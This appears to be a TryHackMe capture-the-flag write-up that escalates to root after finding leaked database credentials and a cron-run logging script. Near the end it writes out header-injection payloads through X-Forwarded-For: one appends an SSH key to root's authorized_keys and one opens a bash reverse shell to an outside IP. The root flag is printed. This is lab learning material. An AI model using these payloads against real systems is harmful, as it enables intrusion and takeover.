
On running linpeas we found. 
```
/var/www/development/config.php:define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');                                    
/var/www/development/config.php:define('DB_USERNAME', 'kitty');
/var/www/html/config.php:define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
/var/www/html/config.php:define('DB_USERNAME', 'kitty');

```

Running [pspy64](https://github.com/DominicBreuker/pspy) on the box

![[Pasted image 20240217002105.png]]

![[Pasted image 20240217002127.png]]

There seems to be another sever running at the box

checking on the db 

![[Pasted image 20240217002545.png]]


and we have another service on port 8080 as we dont have any other user data other then kitty
![[Pasted image 20240217002915.png]]

forwarding the port to local 

![[Pasted image 20240217004135.png]]

And there is the usual same old webpage.

Focusing back on the script in /opt/ 
it so seems that its logging the data to the root folder, we can somehow overwrite the data and try to get the root access

On checking the code base, we see that we are logging the ip for the bad user activity where sql injection is detected, but on trying an empty string is being populated..

![[Pasted image 20240217004626.png]]

On checking the request, we dont have the desired parameter itself...
![[Pasted image 20240217004830.png]]

After working on payload and adding the headers, we finally got the desired output in the logged file, but its being overwritten by the cron

![[Pasted image 20240217005702.png]]

![[Pasted image 20240217005714.png]]

We can escape the echo by passing  ";" and then the own command


`X-Forwarded-For:; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRj4MK91KXpCZgtSZqy1RAOjWWVyW/GVdjFCjH/4msx"> /root/.ssh/authorized_keys`
![[Pasted image 20240217010257.png]]


```
X-Forwarded-For:; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.17.55.107/9001 0>&1'
```

Okay so with the above header being passed with the port opened to listen, we finally got the reverse shell.

![[Pasted image 20240217011755.png]]

![[Pasted image 20240217011918.png]]

Root flag: THM{581bfc26b53f2e167a05613eecf039bb}

